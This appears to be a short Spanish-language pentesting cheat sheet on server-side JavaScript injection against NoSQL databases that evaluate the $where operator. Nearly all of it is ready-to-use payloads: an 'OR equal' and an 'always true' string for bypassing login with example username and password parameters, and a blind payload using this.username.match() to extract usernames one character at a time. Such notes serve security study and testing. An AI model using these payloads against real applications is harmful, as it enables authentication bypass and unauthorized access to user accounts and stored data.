## INFO
Un tipo único de NoSQLI es JS injection.

- Consiste en la capacidad de ejecutar código JS en el contexto de la DB.
- Se da cuando la lógica utiliza el operador $WHERE


## OR equal

Podríamos injectar estos códigos en las variables para que la lógica de la DB traiga todos los documentos y quedemos autenticados en el primer hallazgo:

    " || ""=="

#### ejemplo:

    username=" || ""=="

## Always TRUE:

Podríamos indicarle a la lógica que siempre devuelva true, logueandonos incluso con un user que no se encuentra en la DB:


    " || true || ""=="

#### EJEMPLO:
Siempre encodear el envío.

    username=" || true || ""=="&password=x


## Blind SSJI bypass

- funciona igual que el blind Nosqli
- Usualmente cuando logramos loguearnos no nos da el nombre del user.

    " || (this.username.match('^.*')) || ""=="

Podemos entonces empezar a agregar caracteres con el fin de adivinar el user. Sabremos que es el caracter cuando nos loguea.


